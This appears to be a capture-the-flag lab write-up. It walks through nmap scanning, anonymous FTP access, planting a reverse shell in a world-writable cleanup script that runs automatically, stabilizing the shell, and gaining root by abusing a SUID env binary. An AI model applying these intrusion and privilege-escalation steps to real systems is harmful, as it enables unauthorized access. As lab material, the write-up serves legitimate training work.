## Initial Enumeration

The only initial information provided is an IP address. We begin by conducting an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -v {target_ip}
```

### Scan Results:

## SMB Enumeration

After downloading both of the photos, no information could be found using stegseek or steghide. Seems to be a dead end.

## FTP enumeration

Logging into the ftp server using anonymous login credentials, there is 1 directory containing 3 files.
```
ðŸ“‚ /
 â”œâ”€â”€ ðŸ“‚ scripts
 â”‚   â”œâ”€â”€ ðŸ“„ clean.sh            (-rwxr-xrwx) # A simple cleanup file that writes logs to removed_files.log
 â”‚   â”œâ”€â”€ ðŸ“„ removed_files.log   (-rw-rw-r--) # Log file for removed files
 â”‚   â”œâ”€â”€ ðŸ“„ to_do.txt           (-rw-r--r--) # Note to disable anonymous login since it's unsafe (Understatement of the century)
```

## FTP Exploitation

 Since there is write permissions to the clean.sh file, writing in a simple reverse shell and setting up a listener provides us a way of getting a shell. Because cleanup.sh is automated to run, when starting the listener it may take a moment to catch the shell.

### Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```
After the shell has stabilized that first flag can be found in user.txt

## Privilege Escalation

Starting with basic enumeration, I like to check for any sudo commands available and suid permissions.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
Using https://gtfobins.github.io/ we find that the env suid bit is set. 

```bash
/usr/bin/env /bin/sh -p
```
And with that we've obtained root privileges!

### Notes:
- Enhance understanding of GTFObin binary commands.
